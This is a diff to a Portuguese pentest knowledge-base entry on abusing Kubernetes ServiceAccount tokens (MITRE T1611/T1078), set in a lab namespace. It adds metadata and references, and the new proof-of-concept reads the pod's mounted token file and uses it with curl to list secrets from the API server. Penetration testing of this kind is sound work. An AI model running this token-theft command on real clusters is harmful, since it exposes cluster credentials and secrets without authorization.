@@ -1,3 +1,15 @@
+---
+id: "0291"
+categoria: "14-k8s"
+familia: "k8s-escape"
+slug: "sa-token"
+angulo: "base"
+mitre: "T1611"
+owasp: ""
+tags: ["14-k8s", "k8s-escape", "base", "t1611"]
+aliases: ["Token de ServiceAccount", "sa-token"]
+---
+
 # Token de ServiceAccount
 
 **Containers** · `T1611 Escape to Host / T1078`
@@ -18,10 +30,10 @@ docker.sock, e metadata cloud. Pentest k8s exige cuidado para não derrubar work
 ## PoC mínimo
 
 ```bash
-# k8s lab namespace
-kubectl -n lab-cb307a auth can-i --list --as=system:serviceaccount:lab:sa-sa-token
-kubectl -n lab-cb307a get secrets
-# prova RBAC excessivo sa-token
+# k8s lab ns — SA token mount
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces/lab/secrets | head
+# seguro: can-i; lab: get secrets — tag cb307a
 ```
 
 **Freio:** Não delete namespaces. Privileged probes podem afetar nós.
@@ -35,4 +47,16 @@ no privileged.
 
 Levo no report: kubectl auth can-i; token redigido; PoC read secret.
 
-Refs: Kubernetes Attack Matrix, NSA/CISA k8s hardening
+## Refs
+
+- [MITRE ATT&CK T1611](https://attack.mitre.org/techniques/T1611/)
+- [MITRE ATT&CK T1078](https://attack.mitre.org/techniques/T1078/)
+- [Microsoft — Kubernetes attack matrix](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/)
+- [NSA/CISA — Kubernetes hardening](https://media.defense.gov/2022/Aug/29/2003064742/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
+
+## Relacionadas
+
+- [Token de ServiceAccount — evidência](0671-k8s-escape-sa-token--evidencia.md)
+- [RBAC wildcards](0292-k8s-escape-rbac.md)
+- [Pod privileged](0293-k8s-escape-privileged.md)
+- [cloud metadata from pod](0296-k8s-escape-imds.md)
